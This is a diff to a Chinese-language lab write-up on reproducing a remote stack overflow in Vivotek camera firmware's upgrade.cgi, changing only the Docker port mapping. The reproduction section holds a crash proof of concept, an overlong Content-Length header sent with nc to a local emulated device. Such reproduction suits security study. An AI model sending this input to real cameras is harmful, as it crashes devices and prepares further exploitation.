@@ -30,7 +30,7 @@ $ docker run -v $PWD/firmware:/root/firmware firmianay/binwalk -Mer /root/firmwa
 
 # 拉取漏洞环境并启动
 $ docker pull firmianay/vivotek:remote_stack_overflow-user
-$ docker run --privileged -p 1234:80 -it vivotek:remote_stack_overflow-user
+$ docker run --privileged -p 8888:80 -it vivotek:remote_stack_overflow-user
 ```
 
 ### 系统级模拟 - 动态调试
@@ -62,7 +62,7 @@ $ docker run --privileged -it vivotek:remote_stack_overflow-system
 ## 漏洞复现
 
 ```sh
-echo -en "POST /cgi-bin/admin/upgrade.cgi\r\nHTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | nc -v 127.0.0.1 1234
+echo -en "POST /cgi-bin/admin/upgrade.cgi\r\nHTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | nc -v 127.0.0.1 8888
 ```
 
 ![img](./crash.png)
